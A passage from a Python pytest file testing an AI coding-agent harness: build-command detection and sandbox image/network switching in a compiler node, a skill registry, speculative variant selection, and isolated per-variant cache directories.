            assert "pip install" in cmd
            assert "pytest" in cmd
            assert cmd != "make build"

    @pytest.mark.asyncio
    async def test_compiler_node_adapts_build_cmd_when_no_makefile(self, monkeypatch):
        # Regression: greenfield runs resolve build_command at cmd_run start
        # when the workspace is empty, so detection returns None and we get
        # the historical 'make build' default. Once codegen lands files, the
        # compiler node must re-detect — otherwise the sandbox runs 'make
        # build' against a Makefile-less repo and exits 127 every iteration.
        from harness import graph as graph_mod
        from harness.sandbox import BuildResult

        captured_cmd: dict[str, str] = {}

        class FakeExecutor:
            def __init__(self, workspace_path, allow_network=False, sandbox_config=None):
                pass
            async def run(self, build_cmd: str) -> BuildResult:
                captured_cmd["cmd"] = build_cmd
                return BuildResult(exit_code=0, raw_output="ok")

        monkeypatch.setattr("harness.sandbox.SandboxExecutor", FakeExecutor)

        with tempfile.TemporaryDirectory() as tmpdir:
            Path(tmpdir, "requirements.txt").write_text("fastapi\n")
            state = {
                "workspace_path": tmpdir,
                "build_command": "make build",
                "allow_network": False,
                "loop_counter": {},
                "messages": [],
            }
            result = await graph_mod.compiler_node(state)

        assert "pip install" in captured_cmd["cmd"]
        assert "pytest" in captured_cmd["cmd"]
        assert result.get("build_command") == captured_cmd["cmd"]

    @pytest.mark.asyncio
    async def test_compiler_node_keeps_explicit_make_build_when_makefile_exists(self, monkeypatch):
        from harness import graph as graph_mod
        from harness.sandbox import BuildResult

        captured_cmd: dict[str, str] = {}

        class FakeExecutor:
            def __init__(self, workspace_path, allow_network=False, sandbox_config=None):
                pass
            async def run(self, build_cmd: str) -> BuildResult:
                captured_cmd["cmd"] = build_cmd
                return BuildResult(exit_code=0, raw_output="ok")

        monkeypatch.setattr("harness.sandbox.SandboxExecutor", FakeExecutor)

        with tempfile.TemporaryDirectory() as tmpdir:
            Path(tmpdir, "Makefile").write_text("build:\n\techo ok\n")
            state = {
                "workspace_path": tmpdir,
                "build_command": "make build",
                "allow_network": False,
                "loop_counter": {},
                "messages": [],
            }
            result = await graph_mod.compiler_node(state)

        assert captured_cmd["cmd"] == "make build"
        assert "build_command" not in result

    @pytest.mark.asyncio
    async def test_compiler_node_swaps_image_and_network_for_python_build(self, monkeypatch):
        # Regression: when the build command adapts to python AND the
        # sandbox image is still the historical bare ubuntu:22.04 default,
        # compiler_node must also swap the image to a python toolchain
        # image and enable network so pip can install deps. Otherwise
        # python3 -m pytest still exits 127 forever.
        from harness import graph as graph_mod
        from harness.sandbox import BuildResult

        captured: dict[str, Any] = {}

        class FakeExecutor:
            def __init__(self, workspace_path, allow_network=False, sandbox_config=None):
                captured["allow_network"] = allow_network
                captured["sandbox_config"] = sandbox_config
            async def run(self, build_cmd: str) -> BuildResult:
                captured["cmd"] = build_cmd
                return BuildResult(exit_code=0, raw_output="ok")

        monkeypatch.setattr("harness.sandbox.SandboxExecutor", FakeExecutor)

        with tempfile.TemporaryDirectory() as tmpdir:
            Path(tmpdir, "requirements.txt").write_text("fastapi\n")
            state = {
                "workspace_path": tmpdir,
                "build_command": "make build",
                "allow_network": False,
                "loop_counter": {},
                "messages": [],
                # P1.3: opt in explicitly so the auto-flip is allowed for
                # this test. Default in real configs is False.
                "sandbox_config": {
                    "docker_image": "ubuntu:22.04",
                    "auto_enable_network_for_install": True,
                },
            }
            result = await graph_mod.compiler_node(state)

        assert "pip install" in captured["cmd"]
        assert captured["sandbox_config"]["docker_image"] == "python:3.12-slim"
        assert captured["allow_network"] is True
        assert result["sandbox_config"]["docker_image"] == "python:3.12-slim"
        assert result["allow_network"] is True

    @pytest.mark.asyncio
    async def test_compiler_node_swaps_image_on_resume_with_already_adapted_command(self, monkeypatch):
        # Regression: a session resumed from a checkpoint where build_command
        # is ALREADY 'python3 -m pytest -q' (adapted by a previous run) but
        # sandbox_config still has the bare ubuntu image — the swap must
        # still fire on its own, not gate behind 'was just adapted this turn'.
        from harness import graph as graph_mod
        from harness.sandbox import BuildResult

        captured: dict[str, Any] = {}

        class FakeExecutor:
            def __init__(self, workspace_path, allow_network=False, sandbox_config=None):
                captured["allow_network"] = allow_network
                captured["sandbox_config"] = sandbox_config
            async def run(self, build_cmd: str) -> BuildResult:
                return BuildResult(exit_code=0, raw_output="ok")

        monkeypatch.setattr("harness.sandbox.SandboxExecutor", FakeExecutor)

        with tempfile.TemporaryDirectory() as tmpdir:
            Path(tmpdir, "requirements.txt").write_text("fastapi\n")
            state = {
                "workspace_path": tmpdir,
                # Already adapted in a prior turn — make-build condition is false.
                "build_command": "python3 -m pip install -r requirements.txt && python3 -m pytest -q",
                "allow_network": False,
                "loop_counter": {},
                "messages": [],
                # P1.3: opt in explicitly so the auto-flip is allowed.
                "sandbox_config": {
                    "docker_image": "ubuntu:22.04",
                    "auto_enable_network_for_install": True,
                },
            }
            result = await graph_mod.compiler_node(state)

        assert captured["sandbox_config"]["docker_image"] == "python:3.12-slim"
        assert captured["allow_network"] is True
        assert result["sandbox_config"]["docker_image"] == "python:3.12-slim"

    @pytest.mark.asyncio
    async def test_compiler_node_preserves_user_chosen_image(self, monkeypatch):
        # Regression: if the user has explicitly customized docker_image
        # away from the bare default, the late-bound swap must respect it.
        from harness import graph as graph_mod
        from harness.sandbox import BuildResult

        captured: dict[str, Any] = {}

        class FakeExecutor:
            def __init__(self, workspace_path, allow_network=False, sandbox_config=None):
                captured["sandbox_config"] = sandbox_config
            async def run(self, build_cmd: str) -> BuildResult:
                return BuildResult(exit_code=0, raw_output="ok")

        monkeypatch.setattr("harness.sandbox.SandboxExecutor", FakeExecutor)

        with tempfile.TemporaryDirectory() as tmpdir:
            Path(tmpdir, "requirements.txt").write_text("fastapi\n")
            state = {
                "workspace_path": tmpdir,
                "build_command": "make build",
                "allow_network": False,
                "loop_counter": {},
                "messages": [],
                "sandbox_config": {"docker_image": "my-company/build:latest"},
            }
            result = await graph_mod.compiler_node(state)

        # User-chosen image is preserved
        assert captured["sandbox_config"]["docker_image"] == "my-company/build:latest"
        assert "sandbox_config" not in result


# ===========================================================================
# SKILLS TESTS
# ===========================================================================

class TestSkills:

    def test_skill_registry_singleton(self):
        from harness.skills import SkillRegistry
        r1 = SkillRegistry()
        r2 = SkillRegistry()
        assert r1 is r2

    def test_register_tool_skill(self):
        from harness.skills import SkillRegistry, ToolSkill, SkillSchema, SkillType

        async def dummy_tool(**kwargs):
            return {"result": "ok"}

        schema = SkillSchema(
            name="test_tool",
            description="A test tool",
            skill_type=SkillType.TOOL,
            parameters=[],
        )
        skill = ToolSkill(schema, dummy_tool)
        registry = SkillRegistry()
        registry.register(skill)
        assert registry.get("test_tool") is not None

    def test_tool_skill_schema(self):
        from harness.skills import ToolSkill, SkillSchema, SkillType, SkillParameter

        async def dummy(**kwargs):
            return {}

        schema = SkillSchema(
            name="test",
            description="Test tool",
            skill_type=SkillType.TOOL,
            parameters=[
                SkillParameter("input", "string", "The input", required=True),
                SkillParameter("verbose", "boolean", "Verbose mode", required=False),
            ],
        )
        skill = ToolSkill(schema, dummy)
        ts = skill.to_tool_schema()
        assert ts["type"] == "function"
        assert ts["function"]["name"] == "test"
        assert "input" in ts["function"]["parameters"]["properties"]

    @pytest.mark.asyncio
    async def test_skill_registry_dispatch_missing(self):
        from harness.skills import SkillRegistry
        with pytest.raises(KeyError):
            await SkillRegistry().dispatch("nonexistent")

    def test_register_builtin_skills(self):
        from harness.skills import register_builtin_skills
        count = register_builtin_skills()
        assert count >= 5

    def test_docgen_skill_types(self):
        from harness.skills import DocGenSkill
        skill = DocGenSkill(doc_type="readme", output_file="README.md")
        assert skill.schema.skill_type.value == "docgen"
        assert skill.doc_type == "readme"


# ===========================================================================
# SPECULATIVE TESTS
# ===========================================================================

class TestSpeculative:

    def test_select_winner_first_success(self):
        from harness.speculative import _select_winner, VariantResult
        results = [
            VariantResult(index=0, variant_id="a", worktree_path="/tmp/a", exit_code=1),
            VariantResult(index=1, variant_id="b", worktree_path="/tmp/b", exit_code=0),
            VariantResult(index=2, variant_id="c", worktree_path="/tmp/c", exit_code=0),
        ]
        winner = _select_winner(results, strategy="first_success")
        assert winner is not None
        assert winner.index == 1

    def test_select_winner_fewest_changes(self):
        from harness.speculative import _select_winner, VariantResult
        from harness.patcher import PatchResult as PR, OperationType
        results = [
            VariantResult(index=0, variant_id="a", worktree_path="/tmp/a", exit_code=0,
                         patch_results=[PR(success=True, file="a.py", operation=OperationType.REPLACE_BLOCK, lines_changed=50)]),
            VariantResult(index=1, variant_id="b", worktree_path="/tmp/b", exit_code=0,
                         patch_results=[PR(success=True, file="b.py", operation=OperationType.REPLACE_BLOCK, lines_changed=10)]),
        ]
        winner = _select_winner(results, strategy="fewest_changes")
        assert winner is not None
        assert winner.index == 1

    def test_select_winner_all_pass_fail(self):
        from harness.speculative import _select_winner, VariantResult
        results = [
            VariantResult(index=0, variant_id="a", worktree_path="/tmp/a", exit_code=0),
            VariantResult(index=1, variant_id="b", worktree_path="/tmp/b", exit_code=1),
        ]
        winner = _select_winner(results, strategy="all_pass")
        assert winner is None

    def test_select_winner_all_pass_success(self):
        from harness.speculative import _select_winner, VariantResult
        results = [
            VariantResult(index=0, variant_id="a", worktree_path="/tmp/a", exit_code=0),
            VariantResult(index=1, variant_id="b", worktree_path="/tmp/b", exit_code=0),
        ]
        winner = _select_winner(results, strategy="all_pass")
        assert winner is not None

    def test_select_winner_no_passing(self):
        from harness.speculative import _select_winner, VariantResult
        results = [
            VariantResult(index=0, variant_id="a", worktree_path="/tmp/a", exit_code=1),
            VariantResult(index=1, variant_id="b", worktree_path="/tmp/b", exit_code=2),
        ]
        winner = _select_winner(results)
        assert winner is None

    def test_variant_passed_property(self):
        from harness.speculative import VariantResult
        vr = VariantResult(index=0, variant_id="a", worktree_path="/tmp/a", exit_code=0)
        assert vr.passed is True
        vr.exit_code = 1
        assert vr.passed is False
        vr.exit_code = 0
        vr.error = "some error"
        assert vr.passed is False

    def test_fallback_result(self):
        from harness.speculative import _fallback_result
        result = _fallback_result()
        assert result["node_state"]["speculative"]["fallback"] is True

    def test_variant_cache_env_creates_isolated_dirs(self):
        # Regression: parallel variants used to share host cache dirs
        # (~/.cache/pip, ~/.cargo/registry etc.) and would race on writes.
        # Each variant now gets its own .harness-cache/<tool>/ directory tree.
        from harness.speculative import _build_variant_cache_env
        with tempfile.TemporaryDirectory() as worktree:
            env = _build_variant_cache_env(worktree)
            # Cover the main package managers and incremental caches
            required = {
                "PIP_CACHE_DIR", "npm_config_cache", "YARN_CACHE_FOLDER",
                "CARGO_HOME", "CARGO_TARGET_DIR", "GOCACHE", "GOMODCACHE",
                "GRADLE_USER_HOME", "MYPY_CACHE_DIR", "RUFF_CACHE_DIR",
                "XDG_CACHE_HOME",
            }
            assert required.issubset(env.keys()), f"missing: {required - env.keys()}"
            # Every direct-path env var should point inside the worktree
            for key in required:
                assert env[key].startswith(worktree), f"{key} not in worktree"
                assert os.path.isdir(env[key]), f"{key} dir not created: {env[key]}"

    def test_variant_cache_env_dirs_isolated_per_variant(self):
        # Two variants must get DIFFERENT cache paths.
        from harness.speculative import _build_variant_cache_env
        with tempfile.TemporaryDirectory() as outer:
            v1 = os.path.join(outer, "variant-1")
            v2 = os.path.join(outer, "variant-2")
            os.makedirs(v1)
            os.makedirs(v2)
            env1 = _build_variant_cache_env(v1)
            env2 = _build_variant_cache_env(v2)
            assert env1["PIP_CACHE_DIR"] != env2["PIP_CACHE_DIR"]
            assert env1["CARGO_HOME"] != env2["CARGO_HOME"]
            assert env1["GOCACHE"] != env2["GOCACHE"]

    def test_variant_cache_env_pytest_addopts_format(self):
        # PYTEST_ADDOPTS must be a valid pytest CLI flag string, not a dir path.
        from harness.speculative import _build_variant_cache_env
        with tempfile.TemporaryDirectory() as wt:
            env = _build_variant_cache_env(wt)
            assert env["PYTEST_ADDOPTS"].startswith("-o cache_dir=")


if __name__ == "__main__":
    pytest.main([__file__, "-v", "--tb=short"])